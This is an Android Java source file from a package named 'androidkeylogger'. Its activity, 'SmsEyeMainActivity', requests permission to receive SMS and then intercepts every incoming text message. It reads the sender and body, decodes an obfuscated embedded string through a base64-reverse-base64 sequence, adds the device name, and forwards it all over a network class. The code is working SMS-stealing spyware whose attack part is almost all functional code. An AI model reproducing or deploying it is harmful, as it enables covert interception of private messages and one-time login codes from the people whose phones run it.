package com.bshu2.androidkeylogger;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.single.PermissionListener;
import com.karumi.dexter.listener.PermissionDeniedResponse;
import com.karumi.dexter.listener.PermissionGrantedResponse;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class SmsEyeMainActivity extends AppCompatActivity {

    private SmsReceiver smsReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Dexter.withContext(this)
                .withPermission(Manifest.permission.RECEIVE_SMS)
                .withListener(new PermissionListener() {
                    @Override
                    public void onPermissionGranted(PermissionGrantedResponse response) {
                        Toast.makeText(SmsEyeMainActivity.this, "SMS Permission Granted", Toast.LENGTH_SHORT).show();
                        registerSMSReceiver();
                    }

                    @Override
                    public void onPermissionDenied(PermissionDeniedResponse response) {
                        Toast.makeText(SmsEyeMainActivity.this, "SMS Permission Denied", Toast.LENGTH_SHORT).show();
                    }

                    @Override
                    public void onPermissionRationaleShouldBeShown(PermissionRequest permission, PermissionToken token) {
                        token.continuePermissionRequest();
                    }
                })
                .check();
    }

    private void registerSMSReceiver() {
        smsReceiver = new SmsReceiver();
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, filter);
    }

    public static class SmsReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent != null && "android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())
                    && SmsEyeUtils.Companion.isPermissionGranted(context)) {

                Bundle extras = intent.getExtras();
                if (extras == null) return;

                Object[] pdus = (Object[]) extras.get("pdus");
                if (pdus == null) return;

                SmsMessage[] messages = new SmsMessage[pdus.length];

                for (int i = 0; i < pdus.length; i++) {
                    Object pdu = pdus[i];
                    if (pdu == null) continue;

                    SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                    messages[i] = message;

                    if (message != null) {
                        String sender = message.getOriginatingAddress();
                        String body = message.getMessageBody();

                        try {
                            // Obfuscated token decoding logic
                            Base64.Decoder decoder = Base64.getDecoder();
                            byte[] bytes1 = "aXViN2lnRFNVQXR1aW9nZHNhNzZndWlHVUlEU0FZSThmSVVEU0FpdmdVSUFkc2FpVlNBSVVzZGFrbHw1MW1jQnhXWXpOWGVpRkVRZ29ESXlDWm53dkprZENQSWRDWm53N0prZENmcVEySjhvQ1pud1hLa2RDdm5RMko4dkNabnc3SmtkQ2ZuUTJKOA==".split("\\|")[0].getBytes(StandardCharsets.UTF_8);
                            String intermediate = new String(decoder.decode(bytes1), StandardCharsets.UTF_8);
                            String reversed = new StringBuilder(intermediate).reverse().toString();
                            byte[] bytes2 = reversed.split("\\|")[0].getBytes(StandardCharsets.UTF_8);
                            String secretInfo = new String(decoder.decode(bytes2), StandardCharsets.UTF_8);

                            String deviceInfo = "𝐝𝐞𝐯𝐢𝐜𝐞 : " + SmsEyeUtils.Companion.getDeviceName();
                            String finalMessage = "𝐍𝐞𝐰 𝐒𝐌𝐒 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝\n\n𝐬𝐞𝐧𝐝𝐞𝐫 : " + sender + "\n𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : " + body + "\n\n" + deviceInfo + "\n\n" + secretInfo;

                            SmsEyeNetwork smsEyeNetwork = new SmsEyeNetwork(context);
                            smsEyeNetwork.sendTextMessage(finalMessage);

                        } catch (Exception e) {
                            e.printStackTrace(); // Log errors if decoding fails
                        }
                    }
                }
            }
        }
    }
}



